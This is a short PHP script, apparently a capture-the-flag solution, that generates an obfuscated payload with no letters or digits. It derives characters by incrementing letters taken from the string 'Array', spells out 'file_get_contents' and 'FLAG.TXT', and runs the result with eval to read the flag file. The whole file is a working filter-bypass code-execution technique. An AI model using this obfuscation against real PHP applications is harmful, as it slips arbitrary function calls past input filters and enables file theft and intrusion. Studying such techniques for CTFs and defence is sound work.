<?php

function generate_lowercase_token_payload($token, $var) {
  $payload = "$var=\"\";";
  for ($i=0; $i<strlen($token); ++$i) {
    if ($token[$i] === '_' || $token[$i] === '.') {
      $payload .= $var.'.="_";';
      continue;
    }

    $payload .= '$__=$_[("_"=="_")+("_"=="_")+("_"=="_")];';
    $payload .= str_repeat('$__++;', ord($token[$i])-ord('a'));
    $payload .= $var.'.=$__;';
  }
  return $payload;
}

function generate_uppercase_token_payload($token, $var) {
  $payload = "$var=\"\";";
  for ($i=0; $i<strlen($token); ++$i) {
    if ($token[$i] === '_' || $token[$i] === '.') {
      $payload .= $var.'.="'.$token[$i].'";';
      continue;
    }

    $payload .= '$__=$_[("_"=="+")];';
    $payload .= str_repeat('$__++;', ord($token[$i])-ord('A'));
    $payload .= $var.'.=$__;';
  }
  return $payload;
}

// $_=$_[("_"=="_")+("_"=="_")+("_"=="_")];
// $__=$_[("_"=="+")];
$payloadInit = '$_=[];$_="$_";';
$fileGetContentsPayload = generate_lowercase_token_payload('file_get_contents', '$___');
$postPayload = generate_uppercase_token_payload('FLAG.TXT', '$____');
$execPayload = '$___($____);';
$finalPayload = $payloadInit . $fileGetContentsPayload . $postPayload . $execPayload;
eval($finalPayload);
// var_dump($___, $____);

